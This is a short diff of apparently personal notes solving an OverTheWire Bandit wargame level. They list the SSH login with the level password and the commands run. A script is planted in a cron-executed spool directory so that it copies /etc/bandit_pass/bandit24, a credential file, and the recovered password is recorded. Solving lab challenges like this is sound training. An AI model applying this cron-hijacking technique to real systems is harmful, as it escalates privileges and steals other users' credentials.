@@ -1,0 +1,20 @@
+connection:
+	ssh bandit23@bandit.labs.overthewire.org -p 2220
+	0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+
+commands ran:
+	cat /etc/cron.d/cronjob_bandit24
+	cat /usr/bin/cronjob_bandit24.sh
+	mktemp -d (output /tmp/tmp.ukfKBdgWsM)
+	cd /tmp/tmp.ukfKBdgWsM
+	chmod 707 .
+	echo "
+		exec > /tmp/tmp.ukfKBdgWsM/cron_all_logs 2>&1
+		echo "running" > /tmp/tmp.ukfKBdgWsM/cron_log
+		cat /etc/bandit_pass/bandit24 > /tmp/tmp.ukfKBdgWsM/bandit24_pass
+	" > /var/spool/bandit24/foo/sc\ .sh
+	cat bandit24_pass
+
+
+password (June 16, 2026):
+	gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
